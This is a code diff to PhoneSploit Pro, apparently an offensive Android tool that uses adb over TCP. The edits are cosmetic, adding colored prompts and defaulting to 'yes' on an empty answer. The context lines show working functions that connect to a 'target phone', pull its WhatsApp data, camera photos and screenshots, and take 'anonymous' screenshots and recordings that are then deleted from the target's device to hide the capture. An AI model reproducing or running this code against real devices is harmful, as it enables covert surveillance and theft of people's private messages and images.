@@ -38,17 +38,17 @@ def check_packages():
         print(f'\n{color.CYAN}Please install Android-Tools (adb){color.WHITE}\n')
 
         choice = input(
-            '\nDo you still want to continue to PhoneSploit Pro? [Y / N] > ').lower()
-        if choice == 'y':
+            '\nDo you still want to continue to PhoneSploit Pro?     Y / N > ').lower()
+        if choice == 'y' or choice == '':
             return
         elif choice == 'n':
             exit_phonesploit_pro()
             return
         else:
-            while choice != 'y' and choice != 'n':
+            while choice != 'y' and choice != 'n' and choice != '':
                 choice = input(
                     '\nInvalid choice!, Press Y or N > ').lower()
-                if choice == 'y':
+                if choice == 'y' or choice == '':
                     return
                 elif choice == 'n':
                     exit_phonesploit_pro()
@@ -60,17 +60,17 @@ def check_packages():
         print(f'\n{color.CYAN}Please install Metasploit-Framework{color.WHITE}\n')
 
         choice = input(
-            '\nDo you still want to continue to PhoneSploit Pro? [Y / N] > ').lower()
-        if choice == 'y':
+            '\nDo you still want to continue to PhoneSploit Pro?     Y / N > ').lower()
+        if choice == 'y' or choice == '':
             return
         elif choice == 'n':
             exit_phonesploit_pro()
             return
         else:
-            while choice != 'y' and choice != 'n':
+            while choice != 'y' and choice != 'n' and choice != '':
                 choice = input(
                     '\nInvalid choice!, Press Y or N > ').lower()
-                if choice == 'y':
+                if choice == 'y' or choice == '':
                     return
                 elif choice == 'n':
                     exit_phonesploit_pro()
@@ -106,7 +106,7 @@ def change_page(name):
 def connect():
     print("\n")
     os.system("adb tcpip 5555")
-    print("\nEnter target phone's IP Address.       Example : 192.168.1.23")
+    print(f"\n{color.CYAN}Enter target phone's IP Address.       {color.YELLOW}Example : 192.168.1.23{color.WHITE}")
     ip = input("> ")
     os.system("adb connect " + ip + ":5555")
 
@@ -144,23 +144,23 @@ def get_screenshot():
     if destination == "":
         destination = 'Downloaded-Files'
         print(
-            f"\nSaving screenshot to PhoneSploit-Pro/{destination}\n")
+            f"\n{color.CYAN}Saving screenshot to PhoneSploit-Pro/{destination}\n{color.WHITE}")
     else:
         print(
-            f"\nSaving screenshot to {destination}\n")
+            f"\n{color.CYAN}Saving screenshot to {destination}\n{color.WHITE}")
 
     os.system(f"adb pull /sdcard/{file_name} {destination}")
 
     # Asking to open file
-    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
-    if choice == 'y':
+    choice = input('\nDo you want to Open the file?     Y / N > ').lower()
+    if choice == 'y' or choice == '':
         os.system(f"{opener} {destination}/{file_name}")
 
     elif not choice == 'n':
-        while choice != 'y' and choice != 'n':
+        while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
-            if choice == 'y':
+            if choice == 'y' or choice == '':
                 os.system(f"{opener} {destination}/{file_name}")
 
     print("\n")
@@ -179,23 +179,23 @@ def screenrecord():
     if destination == "":
         destination = 'Downloaded-Files'
         print(
-            f"\nSaving video to PhoneSploit-Pro/{destination}\n")
+            f"\n{color.CYAN}Saving video to PhoneSploit-Pro/{destination}\n{color.WHITE}")
     else:
         print(
-            f"\nSaving video to {destination}\n")
+            f"\n{color.CYAN}Saving video to {destination}\n{color.WHITE}")
 
     os.system(f"adb pull /sdcard/{file_name} {destination}")
 
     # Asking to open file
-    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
-    if choice == 'y':
+    choice = input('\nDo you want to Open the file?     Y / N > ').lower()
+    if choice == 'y' or choice == '':
         os.system(f"{opener} {destination}/{file_name}")
 
     elif not choice == 'n':
-        while choice != 'y' and choice != 'n':
+        while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
-            if choice == 'y':
+            if choice == 'y' or choice == '':
                 os.system(f"{opener} {destination}/{file_name}")
     print("\n")
 
@@ -206,13 +206,14 @@ def pull_file():
     destination = input("> ")
     if destination == "":
         destination = 'Downloaded-Files'
-        print(f"\nSaving file to PhoneSploit-Pro/{destination}\n")
+        print(
+            f"\n{color.CYAN}Saving file to PhoneSploit-Pro/{destination}\n{color.WHITE}")
     else:
-        print(f"\nSaving file to {destination}\n")
+        print(f"\n{color.CYAN}Saving file to {destination}\n{color.WHITE}")
     os.system(f'adb pull /sdcard/{location} {destination}')
 
     # Asking to open file
-    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
+    choice = input('\nDo you want to Open the file?     Y / N > ').lower()
 
     # updating location = file_name if it existed inside a folder
     # Example : sdcard/DCIM/longtime.jpg -> longtime.jpg
@@ -220,14 +221,14 @@ def pull_file():
     location = file_path[len(file_path)-1]
 
     # processing request
-    if choice == 'y':
+    if choice == 'y' or choice == '':
         os.system(f"{opener} {destination}/{location}")
 
     elif not choice == 'n':
-        while choice != 'y' and choice != 'n':
+        while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
-            if choice == 'y':
+            if choice == 'y' or choice == '':
                 os.system(f"{opener} {destination}/{location}")
 
 
@@ -364,9 +365,10 @@ def copy_whatsapp():
     destination = input("> ")
     if destination == "":
         destination = 'Downloaded-Files'
-        print(f"\nSaving data to PhoneSploit-Pro/{destination}\n")
+        print(
+            f"\n{color.CYAN}Saving data to PhoneSploit-Pro/{destination}\n{color.WHITE}")
     else:
-        print(f"\nSaving data to {destination}\n")
+        print(f"\n{color.CYAN}Saving data to {destination}\n{color.WHITE}")
 
     location = '/sdcard/Android/media/com.whatsapp/WhatsApp'
     # 'test -d' checks if directory exist or not
@@ -387,9 +389,10 @@ def copy_screenshots():
     destination = input("> ")
     if destination == "":
         destination = 'Downloaded-Files'
-        print(f"\nSaving Screenshots to PhoneSploit-Pro/{destination}\n")
+        print(
+            f"\n{color.CYAN}Saving Screenshots to PhoneSploit-Pro/{destination}\n{color.WHITE}")
     else:
-        print(f"\nSaving Screenshots to {destination}\n")
+        print(f"\n{color.CYAN}Saving Screenshots to {destination}\n{color.WHITE}")
 
     location = '/sdcard/Pictures/Screenshots'
     os.system(f"adb pull {location} {destination}")
@@ -401,9 +404,10 @@ def copy_camera():
     destination = input("> ")
     if destination == "":
         destination = 'Downloaded-Files'
-        print(f"\nSaving Photos to PhoneSploit-Pro/{destination}\n")
+        print(
+            f"\n{color.CYAN}Saving Photos to PhoneSploit-Pro/{destination}\n{color.WHITE}")
     else:
-        print(f"\nSaving Photos to {destination}\n")
+        print(f"\n{color.CYAN}Saving Photos to {destination}\n{color.WHITE}")
 
     location = '/sdcard/DCIM/Camera'
     os.system(f"adb pull {location} {destination}")
@@ -419,26 +423,26 @@ def anonymous_screenshot():
     if destination == "":
         destination = 'Downloaded-Files'
         print(
-            f"\nSaving screenshot to PhoneSploit-Pro/{destination}\n")
+            f"\n{color.CYAN}Saving screenshot to PhoneSploit-Pro/{destination}\n{color.CYAN}")
     else:
         print(
-            f"\nSaving screenshot to {destination}\n")
+            f"\n{color.CYAN}Saving screenshot to {destination}\n{color.CYAN}")
 
     os.system(f"adb pull /sdcard/{file_name} {destination}")
 
-    print('\nDeleting screenshot from Target\'s device\n')
+    print(f'\n{color.YELLOW}Deleting screenshot from Target\'s device\n{color.WHITE}')
     os.system(f"adb shell rm /sdcard/{file_name}")
 
     # Asking to open file
-    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
-    if choice == 'y':
+    choice = input('\nDo you want to Open the file?     Y / N > ').lower()
+    if choice == 'y' or choice == '':
         os.system(f"{opener} {destination}/{file_name}")
 
     elif not choice == 'n':
-        while choice != 'y' and choice != 'n':
+        while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
-            if choice == 'y':
+            if choice == 'y' or choice == '':
                 os.system(f"{opener} {destination}/{file_name}")
 
     print("\n")
@@ -457,25 +461,25 @@ def anonymous_screenrecord():
     if destination == "":
         destination = 'Downloaded-Files'
         print(
-            f"\nSaving video to PhoneSploit-Pro/{destination}\n")
+            f"\n{color.CYAN}Saving video to PhoneSploit-Pro/{destination}\n{color.WHITE}")
     else:
         print(
-            f"\nSaving video to {destination}\n")
+            f"\n{color.CYAN}Saving video to {destination}\n{color.WHITE}")
 
     os.system(f"adb pull /sdcard/{file_name} {destination}")
 
-    print('\nDeleting video from Target\'s device\n')
+    print(f'\n{color.YELLOW}Deleting video from Target\'s device\n{color.WHITE}')
     os.system(f"adb shell rm /sdcard/{file_name}")
     # Asking to open file
-    choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
-    if choice == 'y':
+    choice = input('\nDo you want to Open the file?     Y / N > ').lower()
+    if choice == 'y' or choice == '':
         os.system(f"{opener} {destination}/{file_name}")
 
     elif not choice == 'n':
-        while choice != 'y' and choice != 'n':
+        while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
-            if choice == 'y':
+            if choice == 'y' or choice == '':
                 os.system(f"{opener} {destination}/{file_name}")
     print("\n")
 
